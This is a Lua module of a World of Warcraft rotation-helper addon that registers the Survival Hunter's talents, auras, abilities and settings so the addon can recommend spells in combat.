-- HunterSurvival.lua
-- June 2018

local addon, ns = ...
local Hekili = _G[ addon ]

local class = Hekili.Class
local state = Hekili.State

local PTR = ns.PTR


-- Shadowlands Legendaries
-- [x] Wildfire Cluster
-- [-] Rylakstalker's Confounding Strikes (passive/reactive)
-- [x] Latent Poison Injectors
-- [x] Butcher's Bone Fragments

-- Conduits
-- [x] Deadly Tandem
-- [x] Flame Infusion
-- [-] Stinging Strike
-- [-] Strength of the Pack


if UnitClassBase( "player" ) == "HUNTER" then
    local spec = Hekili:NewSpecialization( 255 )

    spec:RegisterResource( Enum.PowerType.Focus, {
        terms_of_engagement = {
            aura = "terms_of_engagement",

            last = function ()
                local app = state.buff.terms_of_engagement.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 1,
            value = 2,
        },

        death_chakram = {
            resource = "focus",
            aura = "death_chakram",

            last = function ()
                return state.buff.death_chakram.applied + floor( state.query_time - state.buff.death_chakram.applied )
            end,

            interval = function () return class.auras.death_chakram.tick_time end,
            value = function () return state.conduit.necrotic_barrage.enabled and 5 or 3 end,
        }
    } )

    -- Talents
    spec:RegisterTalents( {
        vipers_venom = 22275, -- 268501
        terms_of_engagement = 22283, -- 265895
        alpha_predator = 22296, -- 269737

        guerrilla_tactics = 21997, -- 264332
        hydras_bite = 22769, -- 260241
        butchery = 22297, -- 212436

        trailblazer = 19347, -- 199921
        natural_mending = 19348, -- 270581
        camouflage = 23100, -- 199483

        bloodseeker = 22277, -- 260248
        steel_trap = 19361, -- 162488
        a_murder_of_crows = 22299, -- 131894

        born_to_be_wild = 22268, -- 266921
        posthaste = 22276, -- 109215
        binding_shot = 22499, -- 109248

        tip_of_the_spear = 22300, -- 260285
        mongoose_bite = 22278, -- 259387
        flanking_strike = 22271, -- 269751

        birds_of_prey = 22272, -- 260331
        wildfire_infusion = 22301, -- 271014
        chakrams = 23105, -- 259391
    } )

    -- PvP Talents
    spec:RegisterPvpTalents( { 
        chimaeral_sting = 3609, -- 356719
        diamond_ice = 686, -- 203340
        dragonscale_armor = 3610, -- 202589
        hiexplosive_trap = 3606, -- 236776
        hunting_pack = 661, -- 203235
        mending_bandage = 662, -- 212640
        roar_of_sacrifice = 663, -- 53480
        sticky_tar = 664, -- 203264
        survival_tactics = 3607, -- 202746
        trackers_net = 665, -- 212638
        tranquilizing_darts = 5420, -- 356015
        wild_kingdom = 5443, -- 356707
    } )

    -- Auras
    spec:RegisterAuras( {
        a_murder_of_crows = {
            id = 131894,
            duration = 15,
            max_stack = 1,
        },
        aspect_of_the_eagle = {
            id = 186289,
            duration = 15,
            max_stack = 1,
        },
        aspect_of_the_turtle = {
            id = 186265,
            duration = 8,
            max_stack = 1,
        },
        binding_shot = {
            id = 117405,
            duration = 3600,
            max_stack = 1,
        },
        camouflage = {
            id = 199483,
            duration = 60,
            max_stack = 1,
        },
        coordinated_assault = {
            id = 266779,
            duration = function () return 20 + ( conduit.deadly_tandem.mod * 0.001 ) end,
            max_stack = 1,
        },
        eagle_eye = {
            id = 6197,
        },
        feign_death = {
            id = 5384,
            duration = 360,
            max_stack = 1,
        },
        freezing_trap = {
            id = 3355,
            duration = 60,
            type = "Magic",
            max_stack = 1,
        },
        growl = {
            id = 2649,
            duration = 3,
            max_stack = 1,
        },
        harpoon = {
            id = 190927,
            duration = 3,
            max_stack = 1,
        },
        hunters_mark = {
            id = 257284,
            duration = 3600,
            type = "Magic",
            max_stack = 1,
        },
        internal_bleeding = {
            id = 270343,
            duration = 9,
            max_stack = 3
        },
        intimidation = {
            id = 24394,
            duration = 5,
            max_stack = 1,
        },
        kill_command = {
            id = 259277,
            duration = 8,
            max_stack = 1,
            generate = function( t )
                local name, _, count, _, duration, expires, caster = FindUnitDebuffByID( "target", 259277, "PLAYER" )

                if name then
                    t.name = name
                    t.count = 1
                    t.expires = expires
                    t.applied = expires - duration
                    t.caster = caster
                    return
                end

                t.count = 0
                t.expires = 0
                t.applied = 0
                t.caster = "nobody"
            end,
            copy = "bloodseeker"
        },
        masters_call = {
            id = 54216,
            duration = 4,
            type = "Magic",
            max_stack = 1,
        },
        misdirection = {
            id = 35079,
            duration = 8,
            max_stack = 1,
        },
        mongoose_fury = {
            id = 259388,
            duration = 14,
            max_stack = 5,
        },
        pathfinding = {
            id = 264656,
            duration = 3600,
            max_stack = 1,
        },
        pheromone_bomb = {
            id = 270332,
            duration = 6,
            max_stack = 1,
        },
        posthaste = {
            id = 118922,
            duration = 4,
            max_stack = 1,
        },
        predator = {
            id = 260249,
            duratinon = 3600,
            max_stack = 10,
        },
        serpent_sting = {
            id = 259491,
            duration = function () return 12 * haste end,
            tick_time = function () return 3 * haste end,
            type = "Poison",
            max_stack = 1,
        },
        shrapnel_bomb = {
            id = 270339,
            duration = 6,
            max_stack = 1,
        },
        steel_trap = {
            id = 162487,
            duration = 20,
            max_stack = 1,
        },
        steel_trap_immobilize = {
            id = 162480,
            duration = 20,
            max_stack = 1,
        },
        tar_trap = {
            id = 135299,
            duration = 3600,
            max_stack = 1,
        },
        terms_of_engagement = {
            id = 265898,
            duration = 10,
            max_stack = 1,
        },
        tip_of_the_spear = {
            id = 260286,
            duration = 10,
            max_stack = 3,
        },
        trailblazer = {
            id = 231390,
            duration = 3600,
            max_stack = 1,
        },
        vipers_venom = {
            id = 268552,
            duration = 8,
            max_stack = 1,
        },
        volatile_bomb = {
            id = 271049,
            duration = 6,
            max_stack = 1,
        },
        wildfire_bomb_dot = {
            id = 269747,
            duration = 6,
            max_stack = 1,
        },
        wildfire_bomb = {
            alias = { "wildfire_bomb_dot", "shrapnel_bomb", "pheromone_bomb", "volatile_bomb" },
            aliasType = "debuff",
            aliasMode = "longest"
        },
        wing_clip = {
            id = 195645,
            duration = 15,
            max_stack = 1,
        },

        -- AZERITE POWERS
        blur_of_talons = {
            id = 277969,
            duration = 6,
            max_stack = 5,
        },

        latent_poison = {
            id = 273286,
            duration = 20,
            max_stack = 10
        },

        primeval_intuition = {
            id = 288573,
            duration = 12,
            max_stack = 5,
        },

        -- Legendaries
        latent_poison_injection = {
            id = 336903,
            duration = 15,
            max_stack = 10
        },

        nessingwarys_trapping_apparatus = {
            id = 336744,
            duration = 5,
            max_stack = 1,
            copy = { "nesingwarys_trapping_apparatus", "nesingwarys_apparatus", "nessingwarys_apparatus" }
        },

        -- Conduits
        strength_of_the_pack = {
            id = 341223,
            duration = 4,
            max_stack = 1
        }
    } )


    spec:RegisterHook( "runHandler", function( action, pool )
        if buff.camouflage.up and action ~= "camouflage" then removeBuff( "camouflage" ) end
        if buff.feign_death.up and action ~= "feign_death" then removeBuff( "feign_death" ) end
    end )


    spec:RegisterStateExpr( "current_wildfire_bomb", function () return "wildfire_bomb" end )


    local function IsActiveSpell( id )
        local slot = FindSpellBookSlotBySpellID( id )
        if not slot then return false end

        local _, _, spellID = GetSpellBookItemName( slot, "spell" )
        return id == spellID 
    end

    state.IsActiveSpell = IsActiveSpell


    local pheromoneReset = false
    local FindUnitDebuffByID = ns.FindUnitDebuffByID

    spec:RegisterEvent( "COMBAT_LOG_EVENT_UNFILTERED", function ()
        local _, subtype, _, sourceGUID, sourceName, _, _, destGUID, destName, destFlags, _, spellID, spellName = CombatLogGetCurrentEventInfo()

        if sourceGUID == state.GUID and spellID == 259489 and subtype == "SPELL_CAST_SUCCESS" then
            pheromoneReset = FindUnitDebuffByID( "target", 270332 ) and true or false
        end
    end )


    local ExpireNesingwarysTrappingApparatus = setfenv( function()
        focus.regen = focus.regen * 0.5
        forecastResources( "focus" )
    end, state )


    -- Tier 28
    spec:RegisterSetBonuses( "tier28_2pc", 364490, "tier28_4pc", 363667 )
    -- 2-Set - Mad Bombardier - When Kill Command resets, it has a 40% chance to make your next Wildfire Bomb incur no cooldown.
    -- 4-Set - Mad Bombardier - Your Wildfire Bombs deal 30% additional damage. This bonus is increased to 80% for bombs empowered by Mad Bombardier.
    spec:RegisterAura( "mad_bombardier", {
        id = 363805,
        duration = 20,
        max_stack = 1,
    } )


    spec:RegisterHook( "reset_precast", function()
        if talent.wildfire_infusion.enabled then
            if IsActiveSpell( 270335 ) then current_wildfire_bomb = "shrapnel_bomb"
            elseif IsActiveSpell( 270323 ) then current_wildfire_bomb = "pheromone_bomb"
            elseif IsActiveSpell( 271045 ) then current_wildfire_bomb = "volatile_bomb"
            else current_wildfire_bomb = "wildfire_bomb" end                
        else
            current_wildfire_bomb = "wildfire_bomb"
        end

        if prev_gcd[1].kill_command and pheromoneReset and cooldown.kill_command.remains > 0 and ( now - action.kill_command.lastCast < 0.25 ) then
            setCooldown( "kill_command", 0 )
        end

        if now - action.harpoon.lastCast < 1.5 then
            setDistance( 5 )
        end

        if debuff.tar_trap.up then
            debuff.tar_trap.expires = debuff.tar_trap.applied + 30
        end

        if buff.nesingwarys_apparatus.up then
            state:QueueAuraExpiration( "nesingwarys_apparatus", ExpireNesingwarysTrappingApparatus, buff.nesingwarys_apparatus.expires )
        end

        if now - action.resonating_arrow.lastCast < 6 then applyBuff( "resonating_arrow", 10 - ( now - action.resonating_arrow.lastCast ) ) end
    end )

    spec:RegisterHook( "specializationChanged", function ()
        current_wildfire_bomb = nil
    end )

    spec:RegisterStateTable( "next_wi_bomb", setmetatable( {}, {
        __index = function( t, k )
            if k == "shrapnel" then return current_wildfire_bomb == "shrapnel_bomb"
            elseif k == "pheromone" then return current_wildfire_bomb == "pheromone_bomb"
            elseif k == "volatile" then return current_wildfire_bomb == "volatile_bomb" end
            return false
        end
    } ) )

    spec:RegisterStateTable( "bloodseeker", setmetatable( {}, {
        __index = function( t, k )
            if k == "count" then
                return active_dot.kill_command
            end

            return debuff.kill_command[ k ]
        end,
    } ) )


    spec:RegisterStateExpr( "bloodseeker", function () return debuff.bloodseeker end )


    -- Abilities
    spec:RegisterAbilities( {
        a_murder_of_crows = {
            id = 131894,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            spend = 30,
            spendType = "focus",

            toggle = "cooldowns",

            startsCombat = true,
            texture = 645217,

            talent = "a_murder_of_crows",

            handler = function ()
                applyDebuff( "target", "a_murder_of_crows" )
            end,
        },


        aspect_of_the_cheetah = {
            id = 186257,
            cast = 0,
            cooldown = function () return ( 180 * ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * ( talent.born_to_be_wild.enabled and 0.8 or 1 ) ) + ( conduit.cheetahs_vigor.mod * 0.001 ) end,
            gcd = "spell",

            startsCombat = false,
            texture = 132242,

            handler = function ()
                applyBuff( "aspect_of_the_cheetah_sprint" )
                applyBuff( "aspect_of_the_cheetah" )
            end,
        },


        aspect_of_the_eagle = {
            id = 186289,
            cast = 0,
            cooldown = function () return 90 * ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * ( talent.born_to_be_wild.enabled and 0.8 or 1 ) end,
            gcd = "off",

            toggle = "cooldowns",

            startsCombat = false,
            texture = 612363,

            handler = function ()
                applyBuff( "aspect_of_the_eagle" )
            end,
        },


        aspect_of_the_turtle = {
            id = 186265,
            cast = 0,
            cooldown = function () return ( 180 * ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * ( talent.born_to_be_wild.enabled and 0.8 or 1 ) ) + ( conduit.harmony_of_the_tortollan.mod * 0.001 ) end,
            gcd = "spell",

            toggle = "defensives",

            startsCombat = false,
            texture = 132199,

            handler = function ()
                applyBuff( "aspect_of_the_turtle" )
                setCooldown( "global_cooldown", 8 )
            end,
        },


        binding_shot = {
            id = 109248,
            cast = 0,
            cooldown = 45,
            gcd = "spell",

            startsCombat = false,
            texture = 462650,

            handler = function ()
                applyDebuff( "target", "binding_shot" )
            end,
        },


        butchery = {
            id = 212436,
            cast = 0,
            charges = 3,
            cooldown = 9,
            recharge = 9,
            hasteCD = true,
            gcd = "spell",

            spend = 30,
            spendType = "focus",

            startsCombat = true,
            texture = 999948,

            aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            talent = "butchery",

            usable = function () return charges > 1 or active_enemies > 1 or target.time_to_die < ( 9 * haste ) end,
            handler = function ()
                gainChargeTime( "wildfire_bomb", min( 5, active_enemies ) )
                gainChargeTime( "shrapnel_bomb", min( 5, active_enemies ) )
                gainChargeTime( "volatile_bomb", min( 5, active_enemies ) )
                gainChargeTime( "pheromone_bomb", min( 5, active_enemies ) )

                if talent.birds_of_prey.enabled and buff.coordinated_assault.up and UnitIsUnit( "pettarget", "target" ) then
                    buff.coordinated_assault.expires = buff.coordinated_assault.expires + 1.5
                end

                if debuff.shrapnel_bomb.up then applyDebuff( "target", "internal_bleeding", 9, min( 3, debuff.internal_bleeding.stack + 1 ) ) end

                removeBuff( "butchers_bone_fragments" )
                
                if conduit.flame_infusion.enabled then
                    addStack( "flame_infusion", nil, 1 )
                end
            end,
        },


        camouflage = {
            id = 199483,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            startsCombat = false,
            texture = 461113,

            talent = "camouflage",

            usable = function () return time == 0 end,
            handler = function ()
                applyBuff( "camouflage" )
            end,
        },


        carve = {
            id = 187708,
            cast = 0,
            cooldown = 6,
            hasteCD = true,
            gcd = "spell",

            spend = 35,
            spendType = "focus",

            startsCombat = true,
            texture = 1376039,

            -- aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            -- cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            notalent = "butchery",

            handler = function ()
                gainChargeTime( "wildfire_bomb", min( 5, active_enemies ) )
                gainChargeTime( "shrapnel_bomb", min( 5, active_enemies ) )
                gainChargeTime( "volatile_bomb", min( 5, active_enemies ) )
                gainChargeTime( "pheromone_bomb", min( 5, active_enemies ) )

                if debuff.shrapnel_bomb.up then applyDebuff( "target", "internal_bleeding", 9, min( 3, debuff.internal_bleeding.stack + 1 ) ) end

                if talent.birds_of_prey.enabled and buff.coordinated_assault.up and UnitIsUnit( "pettarget", "target" ) then
                    buff.coordinated_assault.expires = buff.coordinated_assault.expires + 1.5
                end

                removeBuff( "butchers_bone_fragments" )

                if conduit.flame_infusion.enabled then
                    addStack( "flame_infusion", nil, 1 )
                end
            end,

            auras = {
                -- Conduit
                flame_infusion = {
                    id = 341401,
                    duration = 8,
                    max_stack = 2,
                }
            }
        },


        chakrams = {
            id = 259391,
            cast = 0,
            cooldown = 20,
            gcd = "spell",

            spend = 15,
            spendType = "focus",

            startsCombat = true,
            texture = 648707,

            talent = "chakrams",

            handler = function ()
            end,
        },


        coordinated_assault = {
            id = 266779,
            cast = 0,
            cooldown = function () return ( essence.vision_of_perfection.enabled and 0.87 or 1 ) * ( legendary.call_of_the_wild.enabled and 0.75 or 1 ) * 120 end,
            gcd = "spell",

            toggle = "cooldowns",

            startsCombat = false,
            texture = 2065565,

            nobuff = function ()
                if settings.ca_vop_overlap then return end
                return "coordinated_assault"
            end,

            usable = function () return pet.alive end,
            handler = function ()
                applyBuff( "coordinated_assault" )
            end,
        },


        disengage = {
            id = 781,
            cast = 0,
            cooldown = 20,
            gcd = "off",

            startsCombat = false,
            texture = 132294,

            handler = function ()
                setDistance( 15 )
                if talent.posthaste.enabled then applyBuff( "posthaste" ) end
                if conduit.tactical_retreat.enabled and target.within8 then applyDebuff( "target", "tactical_retreat" ) end
            end,
        },


        --[[ eagle_eye = {
            id = 6197,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            startsCombat = true,
            texture = 132172,

            handler = function ()
            end,
        }, ]]


        exhilaration = {
            id = 109304,
            cast = 0,
            cooldown = 120,
            gcd = "spell",

            toggle = "defensives",

            startsCombat = false,
            texture = 461117,

            handler = function ()
                gain( 0.3 * health.max, "health" )
                if conduit.rejuvenating_wind.enabled then applyBuff( "rejuvenating_wind" ) end
            end,
        },


        --[[ Using from BM module.
            feign_death = {
            id = 5384,
            cast = 0,
            cooldown = 30,
            gcd = "off",

            startsCombat = false,
            texture = 132293,

            handler = function ()
                applyBuff( "feign_death" )
            end,
        }, ]]


        flanking_strike = {
            id = 269751,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            spend = -30,
            spendType = "focus",

            startsCombat = true,
            texture = 236184,

            talent = "flanking_strike",

            usable = function () return pet.alive end,
        },


        --[[ flare = {
            id = 1543,
            cast = 0,
            cooldown = 20,
            gcd = "spell",

            startsCombat = true,
            texture = 135815,

            handler = function ()
                applyDebuff( "target", "flare" )
            end,
        }, ]]


        freezing_trap = {
            id = 187650,
            cast = 0,
            cooldown = 30,
            gcd = "spell",
            
            spend = function ()
                if legendary.nessingwarys_trapping_apparatus.enabled then
                    return -45, "focus"
                end
            end,
            
            startsCombat = false,
            texture = 135834,

            handler = function ()
                applyDebuff( "target", "freezing_trap" )
            end,
        },


        harpoon = {
            id = 190925,
            cast = 0,
            charges = 1,
            cooldown = 20,
            recharge = 20,
            gcd = "spell",

            startsCombat = true,
            texture = 1376040,

            usable = function () return settings.use_harpoon and target.distance > 8, "harpoon disabled or target too close" end,
            handler = function ()
                applyDebuff( "target", "harpoon" )
                if talent.terms_of_engagement.enabled then applyBuff( "terms_of_engagement" ) end
                setDistance( 5 )
            end,
        },
        

        hunters_mark = {
            id = 257284,
            cast = 0,
            cooldown = 0,
            gcd = "spell",
            
            startsCombat = false,
            texture = 236188,
            
            handler = function ()
                applyDebuff( "target", "hunters_mark" )
            end,
        },


        intimidation = {
            id = 19577,
            cast = 0,
            cooldown = 60,
            gcd = "spell",

            startsCombat = true,
            texture = 132111,

            usable = function () return pet.alive, "requires a living pet" end,
            handler = function ()
                applyDebuff( "target", "intimidation" )
            end,
        },


        kill_command = {
            id = 259489,
            cast = 0,
            charges = function () return talent.alpha_predator.enabled and 2 or nil end,
            cooldown = 6,
            recharge = 6,
            hasteCD = true,
            gcd = "spell",

            spend = -15,
            spendType = "focus",

            startsCombat = true,
            texture = 132176,

            cycle = function () return talent.bloodseeker.enabled and "kill_command" or nil end,

            usable = function () return pet.alive, "requires a living pet" end,
            handler = function ()
                if talent.bloodseeker.enabled then
                    applyBuff( "predator", 8 )
                    applyDebuff( "target", "kill_command", 8 )
                end
                if talent.tip_of_the_spear.enabled then addStack( "tip_of_the_spear", 20, 1 ) end

                if debuff.pheromone_bomb.up then 
                    if talent.alpha_predator.enabled then gainCharges( "kill_command", 1 )
                    else setCooldown( "kill_command", 0 ) end
                end

                if debuff.shrapnel_bomb.up then applyDebuff( "target", "internal_bleeding", 9, min( 3, debuff.internal_bleeding.stack + 1 ) ) end
            end,
        },


        kill_shot = {
            id = 320976,
            cast = 0,
            cooldown = 10,
            gcd = "spell",
            
            spend = function () return buff.flayers_mark.up and 0 or 10 end,
            spendType = "focus",
            
            startsCombat = true,
            texture = 236174,
            
            usable = function () return buff.flayers_mark.up or target.health_pct < 20, "requires target health below 20 percent" end,
            handler = function ()
                if buff.flayers_mark.up and legendary.pouch_of_razor_fragments.enabled then
                    applyDebuff( "target", "pouch_of_razor_fragments" )
                    removeBuff( "flayers_mark" )
                end
            end,
        },


        masters_call = {
            id = 272682,
            cast = 0,
            cooldown = 45,
            gcd = "off",

            startsCombat = false,
            texture = 236189,

            usable = function () return pet.alive, "requires a living pet" end,
            handler = function ()
                applyBuff( "masters_call" )
            end,
        },


        misdirection = {
            id = 34477,
            cast = 0,
            cooldown = 30,
            gcd = "off",

            startsCombat = false,
            texture = 132180,

            usable = function () return pet.alive or group, "requires a living pet or ally" end,
            handler = function ()
                applyBuff( "misdirection" )
            end,
        },


        mongoose_bite = {
            id = 259387,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 30,
            spendType = "focus",

            startsCombat = true,
            texture = 1376044,

            aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            talent = "mongoose_bite",

            handler = function ()
                if buff.mongoose_fury.down then applyBuff( "mongoose_fury" )
                else applyBuff( "mongoose_fury", buff.mongoose_fury.remains, min( 5, buff.mongoose_fury.stack + 1 ) ) end
                if debuff.shrapnel_bomb.up then
                    if debuff.internal_bleeding.up then applyDebuff( "target", "internal_bleeding", 9, debuff.internal_bleeding.stack + 1 ) end
                end

                removeDebuff( "target", "latent_poison" )
                removeDebuff( "target", "latent_poison_injection" )

                if azerite.wilderness_survival.enabled then
                    gainChargeTime( "wildfire_bomb", 1 )
                    if talent.wildfire_infusion.enabled then
                        gainChargeTime( "shrapnel_bomb", 1 )
                        gainChargeTime( "pheromone_bomb", 1 )
                        gainChargeTime( "volatile_bomb", 1 )
                    end
                end

                if azerite.primeval_intuition.enabled then
                    addStack( "primeval_intuition", nil, 1 )
                end

                if azerite.blur_of_talons.enabled and buff.coordinated_assault.up then
                    addStack( "blur_of_talons", nil, 1)
                end

                if legendary.butchers_bone_fragments.enabled then
                    addStack( "butchers_bone_fragments", nil, 1 )
                end
            end,

            copy = { 265888, "mongoose_bite_eagle" }
        },


        muzzle = {
            id = 187707,
            cast = 0,
            cooldown = 15,
            gcd = "off",

            startsCombat = true,
            texture = 1376045,

            toggle = "interrupts",

            debuff = "casting",
            readyTime = state.timeToInterrupt,

            handler = function ()
                if conduit.reversal_of_fortune.enabled then
                    gain( conduit.reversal_of_fortune.mod, "focus" )
                end

                interrupt()
            end,
        },


        pheromone_bomb = {
            -- id = 270323,            
            known = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = function () return buff.mad_bombardier.up and 0 or 18 end,
            recharge = function () return buff.mad_bombardier.up and 0 or 18 end,
            gcd = "spell",

            startsCombat = true,

            bind = "wildfire_bomb",
            talent = "wildfire_infusion",

            usable = function () return current_wildfire_bomb == "pheromone_bomb" end,
            handler = function ()
                applyDebuff( "target", "pheromone_bomb" )
                current_wildfire_bomb = "wildfire_bomb"
                removeBuff( "mad_bombardier" )
            end,
        },


        raptor_strike = {
            id = 186270,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 30,
            spendType = "focus",

            startsCombat = true,
            texture = 1376046,

            aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            notalent = "mongoose_bite",

            handler = function ()
                removeBuff( "tip_of_the_spear" )

                if debuff.shrapnel_bomb.up then
                    if debuff.internal_bleeding.up then applyDebuff( "target", "internal_bleeding", 9, debuff.internal_bleeding.stack + 1 ) end
                end

                if talent.birds_of_prey.enabled and buff.coordinated_assault.up and UnitIsUnit( "pettarget", "target" ) then
                    buff.coordinated_assault.expires = buff.coordinated_assault.expires + 1.5
                end

                removeDebuff( "target", "latent_poison" )
                removeDebuff( "target", "latent_poison_injection" )

                if azerite.wilderness_survival.enabled then
                    gainChargeTime( "wildfire_bomb", 1 )
                    if talent.wildfire_infusion.enabled then
                        gainChargeTime( "shrapnel_bomb", 1 )
                        gainChargeTime( "pheromone_bomb", 1 )
                        gainChargeTime( "volatile_bomb", 1 )
                    end
                end

                if azerite.primeval_intuition.enabled then
                    addStack( "primeval_intuition", nil, 1 )
                end

                if azerite.blur_of_talons.enabled and buff.coordinated_assault.up then
                    addStack( "blur_of_talons", nil, 1)
                end

                if legendary.butchers_bone_fragments.enabled then
                    addStack( "butchers_bone_fragments", nil, 1 )
                end
            end,

            copy = { "raptor_strike_eagle", 265189 },

            auras = {
                butchers_bone_fragments = {
                    id = 336908,
                    duration = 12,
                    max_stack = 6,
                },
            }
        },


        serpent_sting = {
            id = 259491,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = function () return buff.vipers_venom.up and 0 or 20 end,
            spendType = "focus",

            startsCombat = true,
            texture = 1033905,

            handler = function ()
                removeBuff( "vipers_venom" )
                applyDebuff( "target", "serpent_sting" )

                if azerite.latent_poison.enabled then
                    applyDebuff( "target", "latent_poison" )
                end

                if legendary.latent_poison_injectors.enabled then
                    applyDebuff( "target", "latent_poison_injection", nil, debuff.latent_poison_injection.stack + 1 )
                end
            end,
        },


        shrapnel_bomb = {
            -- id = 270335,
            known = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = function () return buff.mad_bombardier.up and 0 or 18 end,
            recharge = function () return buff.mad_bombardier.up and 0 or 18 end,
            hasteCD = true,
            gcd = "spell",

            startsCombat = true,

            bind = "wildfire_bomb",

            usable = function () return current_wildfire_bomb == "shrapnel_bomb" end,
            handler = function ()
                applyDebuff( "target", "shrapnel_bomb" )
                current_wildfire_bomb = "wildfire_bomb"
                removeBuff( "mad_bombardier" )
            end,
        },


        steady_shot = {
            id = 56641,
            cast = 1.75,
            cooldown = 0,
            gcd = "spell",
            
            startsCombat = true,
            texture = 132213,
            
            handler = function ()
            end,
        },


        steel_trap = {
            id = 162488,
            cast = 0,
            cooldown = 30,
            gcd = "spell",

            spend = function ()
                if legendary.nessingwarys_trapping_apparatus.enabled then
                    return -45, "focus"
                end
            end,

            startsCombat = false,
            texture = 1467588,

            handler = function ()
                applyDebuff( "target", "steel_trap" )
            end,
        },


        summon_pet = {
            id = 883,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 0,
            spendType = "focus",

            startsCombat = false,
            texture = 'Interface\\ICONS\\Ability_Hunter_BeastCall',

            essential = true,
            nomounted = true,

            usable = function () return not pet.exists end,
            handler = function ()
                summonPet( "made_up_pet", 3600, "ferocity" )
            end,
        },


        tar_trap = {
            id = 187698,
            cast = 0,
            cooldown = function () return level > 55 and 25 or 30 end,
            gcd = "spell",
            
            spend = function ()
                if legendary.nessingwarys_trapping_apparatus.enabled then
                    return -45, "focus"
                end
            end,

            startsCombat = false,
            texture = 576309,

            handler = function ()
                applyDebuff( "target", "tar_trap" )
            end,
        },


        tranquilizing_shot = {
            id = 19801,
            cast = 0,
            cooldown = 10,
            gcd = "spell",
            
            startsCombat = true,
            texture = 136020,

            toggle = "interrupts",
            
            usable = function () return buff.dispellable_enrage.up or buff.dispellable_magic.up, "requires dispellable_enrage or dispellable_magic" end,
            handler = function ()
                removeBuff( "dispellable_enrage" )
                removeBuff( "dispellable_magic" )
                if level > 53 then gain( 10, "focus" ) end
            end,
        },


        volatile_bomb = {
            -- id = 271045,
            known = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = function () return buff.mad_bombardier.up and 0 or 18 end,
            recharge = function () return buff.mad_bombardier.up and 0 or 18 end,
            hasteCD = true,
            gcd = "spell",

            startsCombat = true,

            bind = "wildfire_bomb",

            usable = function () return current_wildfire_bomb == "volatile_bomb" end,
            handler = function ()
                if debuff.serpent_sting.up then applyDebuff( "target", "serpent_sting" ) end
                current_wildfire_bomb = "wildfire_bomb"
                removeBuff( "mad_bombardier" )
            end,
        },


        wildfire_bomb = {
            id = function ()
                if current_wildfire_bomb == "wildfire_bomb" then return 259495
                elseif current_wildfire_bomb == "pheromone_bomb" then return 270323
                elseif current_wildfire_bomb == "shrapnel_bomb" then return 270335
                elseif current_wildfire_bomb == "volatile_bomb" then return 271045 end 
                return 259495
            end,
            flash = { 270335, 270323, 271045, 259495 },
            known = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = function () return buff.mad_bombardier.up and 0 or 18 end,
            recharge = function () return buff.mad_bombardier.up and 0 or 18 end,
            hasteCD = true,
            gcd = "spell",

            startsCombat = true,
            --[[ texture = function ()
                local a = current_wildfire_bomb and current_wildfire_bomb or "wildfire_bomb"
                if a == "wildfire_bomb" or not action[ a ] then return 2065634 end                
                return action[ a ].texture
            end, ]]

            aura = "wildfire_bomb",
            bind = function () return current_wildfire_bomb end,

            handler = function ()
                if current_wildfire_bomb ~= "wildfire_bomb" then
                    runHandler( current_wildfire_bomb )
                    current_wildfire_bomb = "wildfire_bomb"
                    return
                end
                applyDebuff( "target", "wildfire_bomb_dot" )
                removeBuff( "flame_infusion" )
                removeBuff( "mad_bombardier" )
            end,

            copy = { 271045, 270335, 270323, 259495 }
        },


        wing_clip = {
            id = 195645,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 20,
            spendType = "focus",

            startsCombat = true,
            texture = 132309,

            handler = function ()
                applyDebuff( "target", "wing_clip" )
            end,
        },
    } )


    spec:RegisterOptions( {
        enabled = true,

        aoe = 2,

        nameplates = true,
        nameplateRange = 8,

        damage = true,
        damageExpiration = 8,

        potion = "spectral_agility",

        package = "Survival"
    } )

    
    spec:RegisterSetting( "use_harpoon", true, {
        name = "|T1376040:0|t Use Harpoon",
        desc = "If checked, the addon will recommend |T1376040:0|t Harpoon when you are out of range and Harpoon is available.",
        type = "toggle",
        width = 1.49
    } )
    
    spec:RegisterSetting( "ca_vop_overlap", false, {
        name = "|T2065565:0|t Coordinated Assault Overlap (Vision of Perfection)",
        desc = "If checked, the addon will recommend |T2065565:0|t Coordinated Assault even if the buff is already applied due to a Vision of Perfection proc.\n" ..
            "This may be preferred when delaying Coordinated Assault would cost you one or more uses of Coordinated Assault in a given fight.",
        type = "toggle",
        width = "full"
    } )


